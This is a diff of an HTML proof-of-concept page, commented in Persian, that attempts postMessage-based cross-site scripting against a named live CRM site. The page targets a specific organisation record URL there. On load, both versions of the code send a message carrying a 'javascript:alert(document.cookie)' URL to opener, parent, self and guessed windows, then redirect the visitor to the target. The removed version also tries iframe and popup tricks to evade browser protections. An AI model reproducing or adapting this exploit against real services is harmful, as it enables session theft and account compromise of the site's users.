@@ -1,135 +1,49 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Auto PostMessage XSS PoC</title>
-  <style>
-    body { font-family: monospace; background: #0d1117; color: #c9d1d9; padding: 20px; }
-    #status { padding: 15px; background: #161b22; border-radius: 6px; margin: 20px 0; }
-    .success { color: #3fb950; }
-    .fail { color: #f85149; }
-    iframe { display: none; }
-  </style>
-</head>
+<html>
 <body>
-  <h2>🔍 Auto PostMessage XSS Tester</h2>
-  <div id="status">⏳ در حال تلاش برای اجرای خودکار...</div>
-  <div id="log"></div>
+<script>
+  // 🔴 این کد باید روی همان دامنه هدف اجرا شود یا بعد از ریدایرکت به هدف
+  const PAYLOAD = { type: "mailchimp", url: "javascript:alert(document.cookie)" };
 
-  <!-- iframe برای تست اگر هدف اجازه framing بدهد -->
-  <iframe id="targetFrame" sandbox="allow-scripts allow-same-origin"></iframe>
-
-  <script>
-    const TARGET = "https://crm.na1.insightly.com/list/Organisation/ALL?blade=/details/organisation/174120691";
-    const PAYLOAD = "javascript:alert(document.cookie)";
-    const TARGET_ORIGIN = "https://crm.na1.insightly.com";
-
-    function log(msg, type = 'info') {
-      const d = document.getElementById('log');
-      const time = new Date().toLocaleTimeString();
-      d.innerHTML += `<div style="color:${type==='error'?'#f85149':'#8b949e'}">[${time}] ${msg}</div>`;
-      console.log(`[${type}] ${msg}`);
+  // اجرای خودکار به محض لود
+  window.addEventListener('load', () => {
+    
+    // ۱. اگر این صفحه توسط هدف باز شده (opener)
+    if (window.opener && !window.opener.closed) {
+      console.log('📤 Sending to opener...');
+      window.opener.postMessage(PAYLOAD, "*");
     }
-
-    function sendPayload(win, origin = "*") {
+    
+    // ۲. اگر داخل iframe هدف هستیم
+    if (window.parent !== window) {
+      console.log('📤 Sending to parent...');
+      window.parent.postMessage(PAYLOAD, "*");
+    }
+    
+    // ۳. ارسال به خودِ پنجره فعلی (اگر کد آسیب‌پذیر روی همین صفحه لود شده)
+    console.log('📤 Sending to self...');
+    window.postMessage(PAYLOAD, "*");
+    
+    // ۴. تلاش برای پیدا کردن تب‌های دیگر با نام‌های رایج
+    const names = ['helper', 'popup', '_blank', 'insightly'];
+    names.forEach(name => {
       try {
-        win.postMessage({ type: "mailchimp", url: PAYLOAD }, origin);
-        log(`✅ Payload sent to ${win === window ? 'self' : 'iframe/window'}`);
-        return true;
-      } catch(e) {
-        log(`❌ Send failed: ${e.message}`, 'error');
-        return false;
-      }
-    }
-
-    // استراتژی ۱: تلاش با iframe (اگر هدف X-Frame-Options نداشته باشد)
-    function tryIframe() {
-      log("🔄 استراتژی ۱: تست با iframe...");
-      const iframe = document.getElementById('targetFrame');
-      
-      // اگر هدف اجازه framing بدهد، می‌توانیم مستقیم postMessage بفرستیم
-      iframe.onload = () => {
-        log("✅ iframe loaded - attempting postMessage...");
-        // ارسال به iframe (نیاز به دانستن exact origin دارد)
-        sendPayload(iframe.contentWindow, TARGET_ORIGIN);
-      };
-      
-      iframe.onerror = () => {
-        log("❌ iframe blocked (X-Frame-Options/CSP)", 'error');
-        tryRedirect();
-      };
-      
-      // لود iframe - اگر هدف اجازه ندهد، onerror صدا زده می‌شود
-      try {
-        iframe.src = TARGET;
-      } catch(e) {
-        log("❌ Cannot set iframe src - cross-origin restriction", 'error');
-        tryRedirect();
-      }
-    }
-
-    // استراتژی ۲: ریدایرکت تب فعلی + ارسال پیام قبل از ناورگیشن
-    function tryRedirect() {
-      log("🔄 استراتژی ۲: ریدایرکت + ارسال فوری...");
-      
-      // ارسال پیام به خودمان قبل از ریدایرکت (اگر هدف listener روی window داشته باشد)
-      // این فقط کار می‌کند اگر کاربر از قبل تب هدف را باز کرده باشد
-      sendPayload(window, TARGET_ORIGIN);
-      
-      // ریدایرکت فوری
-      setTimeout(() => {
-        log("🔄 Navigating to target...");
-        location.replace(TARGET);
-      }, 100);
-    }
-
-    // استراتژی ۳: تلاش برای window.open با کمترین تاخیر (شانس کم در مرورگرهای جدید)
-    function tryAutoOpen() {
-      log("🔄 استراتژی ۳: window.open با تاخیر حداقل...");
-      
-      // برخی مرورگرهای قدیمی اگر زیر ۱ ثانیه بعد از load باشد، اجازه می‌دهند
-      const helper = window.open('', '_blank', 'width=1,height=1');
-      
-      if (helper && !helper.closed) {
-        log("✅ window.open succeeded (legacy browser?)");
-        helper.document.write(`
-          <script>
-            setTimeout(() => {
-              for(let i=0; i<5; i++) {
-                setTimeout(() => {
-                  window.opener?.postMessage({type:"mailchimp", url:"${PAYLOAD}"}, "*");
-                }, i*500);
-              }
-            }, 2000);
-          <\/script>
-        `);
-        helper.document.close();
-        location.href = TARGET;
-      } else {
-        log("❌ window.open blocked - requires user gesture", 'error');
-        document.getElementById('status').innerHTML = 
-          `<span class="fail">❌ نیاز به کلیک کاربر دارد.</span><br>
-           <small>مرورگرهای مدرن User Activation را اجباری کرده‌اند.</small>`;
-      }
-    }
-
-    // اجرای خودکار به محض لود صفحه
-    document.addEventListener('DOMContentLoaded', () => {
-      log("🚀 Auto-execution started...");
-      
-      // ترتیب تلاش: iframe → redirect → auto-open
-      tryIframe();
-      
-      // اگر iframe بعد از ۳ ثانیه لود نشد، استراتژی بعدی
-      setTimeout(() => {
-        if (document.getElementById('targetFrame').contentDocument?.location?.href === 'about:blank') {
-          tryRedirect();
+        const win = window.open('', name);
+        if (win && win !== window) {
+          console.log(`📤 Sending to ${name}...`);
+          win.postMessage(PAYLOAD, "*");
         }
-      }, 3000);
-      
-      // تلاش آخر با تاخیر بسیار کم (شانس کم)
-      setTimeout(tryAutoOpen, 500);
+      } catch(e) {}
     });
-  </script>
+  });
+
+  // اگر هنوز روی دامنه مهاجم هستی، ریدایرکت به هدف
+  setTimeout(() => {
+    if (location.hostname !== 'crm.na1.insightly.com') {
+      location.href = 'https://crm.na1.insightly.com/list/Organisation/ALL?blade=/details/organisation/174120691';
+    }
+  }, 500);
+</script>
+<p>⏳ در حال اجرای خودکار... کنسول را چک کن.</p>
 </body>
 </html>
